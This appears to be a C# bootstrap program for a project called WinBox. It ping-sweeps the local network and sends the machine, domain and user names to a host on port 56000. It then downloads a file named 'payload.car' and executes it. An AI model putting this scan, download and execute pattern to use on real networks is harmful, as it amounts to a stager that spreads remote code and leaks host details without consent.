using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using WinBox.Net;

namespace WinBox.Boot
{
    public class BootProgram
    {
        static readonly object sync = new object();

        static AutoResetEvent waiter;
        static Dictionary<IPAddress, IPStatus?> scanned;

        public static void Main(string[] args)
        {
            waiter = new AutoResetEvent(false);
            scanned = new Dictionary<IPAddress, IPStatus?>();
            var arg = args.FirstOrDefault();
            if (!string.IsNullOrEmpty(arg))
            {
                if (char.IsNumber(arg.First()))
                    TryConnect(IPAddress.Parse(arg));
                else
                    foreach (var addr in Dns.GetHostAddresses(arg))
                        TryConnect(addr);
            }
            else
            {
                TryFind();
            }
            waiter.WaitOne();
            Console.WriteLine("Boot completed.");
        }

        static void TryFind()
        {
            TryFind(Networking.GetAllIPAddresses());
        }

        static void TryFind(IEnumerable<IPAddress> addresses)
        {
            lock (sync)
            {
                foreach (var address in addresses)
                {
                    scanned[address] = null;
                    var ping = new Ping();
                    ping.PingCompleted += OnPingResult;
                    try { ping.SendAsync(address, address); }
                    catch { ping.Dispose(); }
                }
            }
        }

        static void OnPingResult(object sender, PingCompletedEventArgs e)
        {
            lock (sync)
            {
                var addr = (IPAddress)e.UserState;
                scanned[addr] = e.Reply.Status;
                if (e.Reply.Status == IPStatus.Success)
                    OnSuccess(addr, e.Reply);
                ((IDisposable)sender).Dispose();
            }
        }

        static void OnSuccess(IPAddress addr, PingReply reply)
        {
            if (reply.Address.AddressFamily == AddressFamily.InterNetwork)
            {
                if (reply.Address.GetAddressBytes()[0] == 127)
                    return;
                TryConnect(addr);
                var subAddr = Networking.GenerateRange(reply.Address).Except(scanned.Keys);
                TryFind(subAddr.ToArray());
            }
        }

        static void TryConnect(IPAddress addr)
        {
            const int port = 56000;
            using (var client = new WebClient())
            {
                client.Headers.Add("machine", Environment.MachineName);
                client.Headers.Add("os", Environment.OSVersion + "");
                client.Headers.Add("domain", Environment.UserDomainName);
                client.Headers.Add("user", Environment.UserName);
                const string file = "payload.car";
                var httpUri = string.Format("http://{0}:{1}/winbox/{2}", addr, port, file);
                var tempFile = Path.GetTempFileName();
                if (!client.TryDownloadFile(httpUri, tempFile))
                    return;
                Console.WriteLine("Downloaded '{0}' into '{1}'!", httpUri, tempFile);
                var uri = new Uri(httpUri);
                var vars = new Dictionary<string, string>
                {
                    { "BOOT", typeof(BootProgram).Assembly.Location },
                    { "PRM", Environment.CommandLine.Trim() },
                    { "URI", httpUri }, { "IP", uri.Host }, { "PORT", uri.Port+"" }
                };
                Payload.HandlePayload(tempFile, vars);
                File.Delete(tempFile);
                waiter.Set();
            }
        }
    }
}